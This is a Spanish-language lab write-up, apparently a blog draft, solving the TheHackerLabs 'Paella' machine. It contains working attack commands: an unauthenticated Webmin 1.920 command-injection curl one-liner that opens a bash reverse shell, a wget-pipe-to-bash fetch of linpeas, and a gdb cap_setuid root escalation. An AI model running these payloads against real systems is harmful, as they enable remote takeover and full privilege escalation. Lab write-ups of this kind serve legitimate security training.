---
layout: single
title: Paella - TheHackerLabs
excerpt: "."
date: 2025-05-21
classes: wide
header:
  teaser: /assets/images/THL-writeup-paella/_logo.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Easy Machine
tags:
  - Linux
  - 
  - 
  - OSCP Style
---
![](/assets/images/THL-writeup-paella/_logo.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.50
PING 192.168.10.50 (192.168.10.50) 56(84) bytes of data.
64 bytes from 192.168.10.50: icmp_seq=1 ttl=64 time=2.18 ms
64 bytes from 192.168.10.50: icmp_seq=2 ttl=64 time=0.912 ms
64 bytes from 192.168.10.50: icmp_seq=3 ttl=64 time=0.883 ms
64 bytes from 192.168.10.50: icmp_seq=4 ttl=64 time=1.16 ms

--- 192.168.10.50 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3026ms
rtt min/avg/max/mdev = 0.883/1.284/2.179/0.527 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.50 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 13:23 CST
Initiating ARP Ping Scan at 13:23
Scanning 192.168.10.50 [1 port]
Completed ARP Ping Scan at 13:23, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:23
Scanning 192.168.10.50 [65535 ports]
Discovered open port 22/tcp on 192.168.10.50
Discovered open port 10000/tcp on 192.168.10.50
Completed SYN Stealth Scan at 13:23, 10.48s elapsed (65535 total ports)
Nmap scan report for 192.168.10.50
Host is up, received arp-response (0.00058s latency).
Scanned at 2025-05-21 13:23:09 CST for 10s
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 64
10000/tcp open  snet-sensor-mgmt syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.74 seconds
           Raw packets sent: 71440 (3.143MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay dos puertos abiertos, pero no había visto antes el uso del puerto 10000.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,10000 192.168.10.50 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 13:24 CST
Nmap scan report for 192.168.10.50
Host is up (0.00100s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7:ac:d4:4b:58:df:a7:4a:ae:86:8c:6c:2b:55:ec:93 (RSA)
|   256 ea:0b:6f:d3:fb:a4:97:3e:42:64:17:59:e7:04:56:43 (ECDSA)
|_  256 d7:03:cb:9b:ff:9f:9c:8c:5c:0d:eb:81:4e:b5:95:40 (ED25519)
10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
|_http-title: Login to Webmin
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.03 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece ser un CMS o algo parecido. Además, tenemos la versión de este servicio, por lo que podemos investigar si hay algún Exploit para esa versión.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-paella/Captura1.png">
</p>

Parece que el servicio se llama **Webmin**. Vamos a investigarlo:

| **Webmin** |
|:-----------:|
| *Webmin es una herramienta de configuración de sistemas accesible vía web para sistemas Unix, como GNU/Linux y OpenSolaris. Con él se pueden configurar aspectos internos de muchos sistemas libres, como el servidor web Apache, PHP, MySQL, DNS, Samba, DHCP, entre otros.* |

<br>

Parece que es un sistema de administración/configuración de sistemas para Linux, etc.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-paella/Captura2.png">
</p>

No muestra algo que nos ayude.

Comprobemos si **whatweb** muestra algo más:
```bash
whatweb http://192.168.10.50:10000
http://192.168.10.50:10000 [200 OK] Cookies[redirect,testing], Country[RESERVED][ZZ], HTML5, HTTPServer[MiniServ/1.920], IP[192.168.10.50], PasswordField[pass], Script, Title[Login to Webmin], UncommonHeaders[auth-type,content-security-policy], X-Frame-Options[SAMEORIGIN]
```
No veo nada más.

Intente aplicar **Fuzzing**, pero parece que ni **gobuster** ni **ffuf** detectan algo.

Investigando la versión de **Webmin** que se está ocupando, encontramos que hay un par de Exploits que podemos probar:
```bash
searchsploit webmin 1.920
.------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Webmin 1.920 - Remote Code Execution                                                                                                                        | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                           | linux/remote/47230.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                               | linux/webapps/47330.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Vamos a probar ambos, empezando por el de **Metasploit**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="Metasploit">Probando Módulo: exploit/linux/http/webmin_backdoor de Metasploit Framework </h2>

Parece que este Exploit, esta explotando una Backdoor que se dejo de la **versión 1.890 a 1.920** de **Webmin**.

Vamos a buscarlo y a usarlo:
```bash
msf6 > search webmin 1.920
.
Matching Modules
================
.
   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor       2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   1    \_ target: Automatic (Unix In-Memory)  .                .          .      .
   2    \_ target: Automatic (Linux Dropper)   .                .          .      .
.
msf6 > use exploit/linux/http/webmin_backdoor
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_backdoor) >
```

Ya solo falta configurarlo:
```bash
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 192.168.10.50
RHOSTS => 192.168.10.50
msf6 exploit(linux/http/webmin_backdoor) > set LHOST Tu_IP
LHOST => Tu_IP
```

Y lo ejecútamos:
```bash
msf6 exploit(linux/http/webmin_backdoor) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (Tu_IP:4444 -> 192.168.10.50:47850) at 2025-05-21 13:51:07 -0600
.
whoami
paella
/bin/bash -i
bash: cannot set terminal process group (516): Inappropriate ioctl for device
bash: no job control in this shell
paella@TheHackersLabs-Paella:/usr/share/webmin/acl$
```
Listo, estamos dentro.

<br>

<h2 id="Exploit">Probando Exploit: Webmin 1.920 - Remote Code Execution</h2>

Vamos a copiarlo en nuestro directorio de trabajo:
```bash
searchsploit -m linux/webapps/47293.sh
  Exploit: Webmin 1.920 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47293
     Path: /usr/share/exploitdb/exploits/linux/webapps/47293.sh
    Codes: CVE-2019-15107
 Verified: False
File Type: POSIX shell script, ASCII text executable
```
Analicemoslo.

Parece que este Exploit, es más un checker que verifica si la máquina/servidor que esta usando esta versión de **Webmin** es vulnerable a **Remote Code Execution**.

En caso de que lo sea, va a mostrar **VULNERABLE**:
```bash
./47293.sh http://192.168.10.50:10000
Testing for RCE (CVE-2019-15107) on http://192.168.10.50:10000: VULNERABLE!
```
Y si, parece que si es vulnerable.

Lo que podemos hacer ahora es, analizar este Exploit y la versión de **Metasploit**, con tal de ver como es que se están ejecutando los comandos.

Quizá podamos desarrollar nuestro propio Exploit.

<br>

<h2 id="Exploit2">Desarrollando Exploit de Remote Code Execution para Webmin 1.920</h2>

Aquí te dejo los Exploit que se usaron y analizamos:
* <a href="https://www.exploit-db.com/exploits/47293" target="_blank">Exploit-DB: Webmin 1.920 - Remote Code Execution</a>
* <a href="https://www.exploit-db.com/exploits/47230" target="_blank">Exploit-DB: Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)</a>

Además, aquí esta la explicación de como se encontro y se Exploto esta vulnerabilidad:
* <a href="https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html" target="_blank">DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution</a>

<br>

En resumén, 


el parámetro vulnerable es `old=`


Podemos comprobarlo con el siguiente oneliner de curl:
```bash
curl -sk -X POST http://192.168.10.50:10000/password_change.cgi -H "Cookie: redirect=1; testing=1; sid=x; sessiontest=1" -H "Referer: http://192.168.10.50:10000/session_login.cgi" -H "Content-Type: application/x-www-form-urlencoded" --data 'user=berserk&pam=&expired=2&old=berserk|id&new1=berserk&new2=berserk' | grep -A2 '<div class="panel-body">'
```

Ve el resultado:
```html
<div class="panel-body">
<hr>
<center><h3>Failed to change password : The current password is incorrectuid=1000(paella) gid=1000(paella) groups=1000(paella)
```
Ahí esta, parece que funciona.

Vamos a mandarnos una **traza ICMP** y la capturaremos con **tcpdump**, para saber si es posible una conexión entre la máquina víctima y la nuestra.

Inicia **tcpdump** para que capture **paquetes ICMP**:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

Y mandamos un ping desde nuestro oneliner:
```bash
curl -sk -X POST http://192.168.10.50:10000/password_change.cgi -H "Cookie: redirect=1; testing=1; sid=x; sessiontest=1" -H "Referer: http://192.168.10.50:10000/session_login.cgi" -H "Content-Type: application/x-www-form-urlencoded" --data 'user=berserk&pam=&expired=2&old=berserk|ping+-c+2+Tu_IP&new1=berserk&new2=berserk' | grep -A2 '<div class="panel-body">'
```

Observa el resultado:
```bash
tcpdump -i eth0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
19:35:16.374119 IP 192.168.10.50 > Tu_IP: ICMP echo request, id 15431, seq 1, length 64
19:35:16.374153 IP Tu_IP > 192.168.10.50: ICMP echo reply, id 15431, seq 1, length 64
19:35:17.375134 IP 192.168.10.50 > Tu_IP: ICMP echo request, id 15431, seq 2, length 64
19:35:17.375155 IP Tu_IP > 192.168.10.50: ICMP echo reply, id 15431, seq 2, length 64
```
Funcionó. Entonces, podemos mandarnos una **Reverse Shell** desde nuestro oneliner.

Abre un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Manda la **Reverse Shell** desde el oneliner:
```bash
curl -sk -X POST http://192.168.10.50:10000/password_change.cgi -H "Cookie: redirect=1; testing=1; sid=x; sessiontest=1" -H "Referer: http://192.168.10.50:10000/session_login.cgi" -H "Content-Type: application/x-www-form-urlencoded" --data 'user=berserk&pam=&expired=2&old=berserk|bash+-c+"bash+-i+>%26+/dev/tcp/Tu_IP/443+0>%261"&new1=berserk&new2=berserk' | grep -A2 '<div class="panel-body">'
```

Observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.50] 34584
bash: cannot set terminal process group (516): Inappropriate ioctl for device
bash: no job control in this shell
paella@TheHackersLabs-Paella:/usr/share/webmin/acl$ whoami
whoami
paella
```
Excelente, estamos dentro.

Ya solamente obtenemos una sesión interactiva, así que ejecuta los siguientes comandos:
```bash
# Paso 1
script /dev/null -c bash

# Paso 2
CTRL + Z

# Paso 3
stty raw -echo; fg

# Paso 4
reset -> xterm

# Paso 5
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```

No olvides buscar la flag del usuario:
```bash
paella@TheHackersLabs-Paella:/usr/share/webmin/acl$ cd /home/paella/
paella@TheHackersLabs-Paella:~$ ls
user.txt
paella@TheHackersLabs-Paella:~$ cat user.txt
...
```





Continuemos.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id="GDB">Enumeración de la Máquina Víctima y Escalando Privilegios con Capabilitie SUID en Binario gdb</h2>

Como tal, no podemos ver los privilegios que tiene nuestro usuario, porque no tenemos su contraseña:
```bash
paella@TheHackersLabs-Paella:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Paella: Name or service not known
[sudo] password for paella: 
paella@TheHackersLabs-Paella:~$
```

Podríamos revisar si hay algún binario con **permisos SUID** del que nos podamos aprovechar:
```bash
paella@TheHackersLabs-Paella:~$ find / -perm -4000 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
Como tal, no hay alguno que nos sirva.

Entonces, usaremos **linpeas.sh** para ver si encuentra alguna cosilla por ahí.

Puedes descargarlo aquí:
* <a href="https://github.com/peass-ng/PEASS-ng/tree/master" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Bien, podemos descargarlo en la máquina víctima, pero en mi caso, lo voy a ejecutar de manera remota.

Primero, levanta un servidor con **Python3**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde la máquina víctima, utilizamos wgte para ejecutar el **linpeas.sh** de manera remota:
```bash
paella@TheHackersLabs-Paella:~$ wget -qO- http://Tu_IP/linpeas.sh | bash
```

Revisando el resultado, nos muestra una vía potencial para escalar privilegios:
```bash
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
══╣ Current shell capabilities
CapInh:  0x0000000000000000=
...
...
Files with capabilities (limited to 50):
/usr/bin/gdb = cap_setuid+ep
```
Parece que el **binario gdb** tiene capabilities que podemos aprovechar para escalar privilegios.

EXPLICAR LA CAPABILITIE

Podemos investigar en la **guía de GTFOBins**, si es que existe una forma en la que podamos abusar de este binario cuando tenga **capabilities SUID**:
* <a href="https://gtfobins.github.io/gtfobins/gdb/" target="_blank">GTFOBins: gdb</a>

Ahí está:

<p align="center">
<img src="/assets/images/THL-writeup-paella/Captura2.png">
</p>

Los comandos indican que debemos asignarle las **capabilities SUID** al binario **gdb**, pero esto ya esta hecho.

Así que solamente tenemos que usar el último comando, pero necesitamos ejecutarlo desde su ubicación.

Se úbica en el directorio `/bin`, pero en caso de que no este ahí (que sería raro), usemos el comando **which** para saber si existe y donde se encuentra:
```bash
paella@TheHackersLabs-Paella:~$ which gdb
/bin/gdb
```

Vamos a movernos al directorio `/bin` y ejecutamos el último comando que nos indica la **guía de GTFOBins**:
```bash
paella@TheHackersLabs-Paella:~$ cd /bin
paella@TheHackersLabs-Paella:/bin$ ./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
...
...
root@TheHackersLabs-Paella:/bin# 
root@TheHackersLabs-Paella:/bin# whoami
root
```
Listo, ya somos **Root**.

Ya solo busquemos la última flag:
```bash
root@TheHackersLabs-Paella:/bin# cd /root
root@TheHackersLabs-Paella:/root# ls
root.txt
root@TheHackersLabs-Paella:/root# cat root.txt
...
```
Y con esto, terminamos la máquina.


<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


* https://es.wikipedia.org/wiki/Webmin
* https://www.exploit-db.com/exploits/47293
* https://www.exploit-db.com/exploits/47230
* https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
* https://github.com/ruthvikvegunta/CVE-2019-15107
* https://github.com/peass-ng/PEASS-ng/tree/master
* https://gtfobins.github.io/gtfobins/gdb/


<br>

# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
